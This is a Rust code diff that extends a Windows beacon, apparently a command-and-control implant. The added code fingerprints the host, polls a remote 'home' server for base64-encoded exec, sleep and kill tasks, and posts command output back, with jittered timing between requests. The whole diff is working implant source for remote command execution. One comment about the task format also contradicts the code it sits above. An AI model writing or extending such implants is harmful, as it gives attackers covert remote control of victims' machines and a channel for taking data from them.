@@ -7,7 +7,18 @@ use std::{
 };
 use windows::core::HSTRING;
 
+use base64::prelude::*;
+
 use crate::collector;
+
+const BASE_JITTER_SECS: u64 = 5;
+const JITTER_RATE: f64 = 0.5;
+
+pub enum Task {
+    Exec(Vec<u8>),
+    Sleep(std::time::Duration),
+    Kill,
+}
 
 pub struct Beacon {
     id: u32,
@@ -29,28 +40,15 @@ impl Beacon {
             client,
             id,
             home,
-            base_jitter: Duration::from_secs(5),
-            rate: 0.5,
+            base_jitter: Duration::from_secs(BASE_JITTER_SECS),
+            rate: JITTER_RATE,
         })
     }
 
-    fn send<F>(&mut self, f: F) -> windows::core::Result<()>
-    where
-        F: FnOnce(&mut Self) -> windows::core::Result<()>,
-    {
+    /// /api/v1/hello POST
+    pub fn initial_request(&mut self) -> windows::core::Result<Response> {
         self.sleep_with_jitter();
-        f(self)
-    }
 
-    pub fn send_initial_request(&mut self) -> windows::core::Result<()> {
-        self.send(|beacon| beacon.initial_request())
-    }
-
-    pub fn send_system_info(&mut self) -> windows::core::Result<()> {
-        self.send(|beacon| beacon.system_info())
-    }
-
-    fn initial_request(&mut self) -> windows::core::Result<()> {
         info!(
             "sending initial request to {}:{}",
             self.home.ip(),
@@ -75,14 +73,13 @@ impl Beacon {
 
         let resp = self.client.request(req)?;
 
-        info!("response status code: {:?}", resp.status_code);
-        info!("response body: {:?}", resp.body);
-        info!("response headers: {:?}", resp.headers);
-
-        Ok(())
+        Ok(resp)
     }
 
-    fn system_info(&mut self) -> windows::core::Result<()> {
+    /// /api/v1/sysinfo POST
+    pub fn send_system_info(&mut self) -> windows::core::Result<Response> {
+        self.sleep_with_jitter();
+
         info!("collecting system info...");
         let sys_info = collector::SystemFingerprint::collect()?;
 
@@ -108,11 +105,97 @@ impl Beacon {
 
         let resp = self.client.request(req)?;
 
-        info!("response status code: {:?}", resp.status_code);
-        info!("response body: {:?}", resp.body);
-        info!("response headers: {:?}", resp.headers);
+        Ok(resp)
+    }
 
-        Ok(())
+    /// /api/v1/task GET
+    pub fn get_task(&mut self) -> windows::core::Result<Task> {
+        self.sleep_with_jitter();
+
+        info!("checking if task is available...");
+
+        let hostname_win = HSTRING::from(self.home.ip().to_string());
+
+        let req = Request {
+            hostname: hostname_win,
+            port: self.home.port(),
+            method: HSTRING::from("GET"),
+            path: HSTRING::from("/api/v1/task"),
+            headers: None,
+            body: None,
+        };
+
+        let resp = self.client.request(req)?;
+
+        // task name is separated from payload with \r\n
+        let colon_index = resp
+            .body
+            .iter()
+            .position(|&b| b == b':')
+            .expect("bad task response format");
+
+        let (task_name_bytes, payload_bytes) = resp.body.split_at(colon_index);
+
+        // skip the colon
+        let payload_bytes = &payload_bytes[1..];
+
+        let task_name = String::from_utf8_lossy(task_name_bytes)
+            .trim()
+            .to_lowercase();
+        let payload_str = String::from_utf8_lossy(payload_bytes);
+
+        // decode base64 payload if present
+        let task = match task_name.as_str() {
+            "exec" => {
+                let decoded = BASE64_STANDARD
+                    .decode(payload_str.as_bytes())
+                    .map_err(|_| windows::core::Error::from_win32())?;
+                Task::Exec(decoded)
+            }
+            "sleep" => {
+                let decoded = BASE64_STANDARD
+                    .decode(payload_str.as_bytes())
+                    .map_err(|_| windows::core::Error::from_win32())?;
+                let millis_str = String::from_utf8_lossy(&decoded);
+                let millis: u64 = millis_str
+                    .parse()
+                    .map_err(|_| windows::core::Error::from_win32())?;
+                Task::Sleep(Duration::from_millis(millis))
+            }
+            "kill" => Task::Kill,
+            other => {
+                debug!("unknown task: {}", other);
+                return Err(windows::core::Error::from_win32());
+            }
+        };
+
+        Ok(task)
+    }
+
+    /// /api/v1/result POST
+    pub fn send_exec_result(&mut self, result: Vec<u8>) -> windows::core::Result<Response> {
+        self.sleep_with_jitter();
+
+        info!("sending command execution result...");
+
+        let headers = [HSTRING::from("Content-Type: application/octet-stream")];
+
+        let header_block = build_winhttp_headers(&headers);
+
+        let hostname_win = HSTRING::from(self.home.ip().to_string());
+
+        let req = Request {
+            hostname: hostname_win,
+            port: self.home.port(),
+            method: HSTRING::from("POST"),
+            path: HSTRING::from("/api/v1/result"),
+            headers: Some(&header_block),
+            body: Some(&result),
+        };
+
+        let resp = self.client.request(req)?;
+
+        Ok(resp)
     }
 
     fn sleep_with_jitter(&self) {
